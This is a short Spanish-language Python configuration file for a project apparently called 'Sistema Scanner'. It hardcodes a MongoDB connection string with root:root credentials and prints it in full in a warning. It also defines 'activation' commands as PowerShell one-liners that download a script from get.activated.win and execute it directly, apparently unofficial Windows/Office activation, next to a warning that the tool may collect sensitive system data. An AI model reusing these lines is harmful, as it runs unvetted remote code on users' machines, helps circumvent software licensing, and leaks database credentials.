"""
Configuraciones globales del Sistema Scanner
"""
import os
from pathlib import Path

# Configuración de MongoDB - URI correcta proporcionada por el usuario
MONGODB_URI_DEFAULT = "mongodb+srv://root:root@proyectofinal.iktfuvz.mongodb.net/?retryWrites=true&w=majority&appName=proyectofinal"
MONGODB_DATABASE = "proyectofinal"
MONGODB_COLLECTION = "scans"

# Configuración de archivos
BASE_DIR = Path(__file__).parent.parent
LOGS_DIR = BASE_DIR / "logs"
SCANS_DIR = BASE_DIR / "scans"

# Configuración de logging
LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
LOG_FILE = LOGS_DIR / "sistema_scanner.log"

# Configuración de activación Windows/Office
ACTIVATION_COMMANDS = {
    "windows_8_10_11": "irm https://get.activated.win | iex",
    "windows_7_legacy": "iex ((New-Object Net.WebClient).DownloadString('https://get.activated.win'))"
}

# Configuración de seguridad
SENSITIVE_DATA_WARNING = "⚠️ ADVERTENCIA: Esta operación puede recopilar datos sensibles del sistema"

def get_mongodb_uri():
    """Obtener URI de MongoDB desde variable de entorno o usar fallback"""
    uri = os.getenv('MONGO_URI')
    if uri:
        return uri
    else:
        print(f"⚠️ ADVERTENCIA: Variable MONGO_URI no encontrada, usando URI por defecto: {MONGODB_URI_DEFAULT}")
        return MONGODB_URI_DEFAULT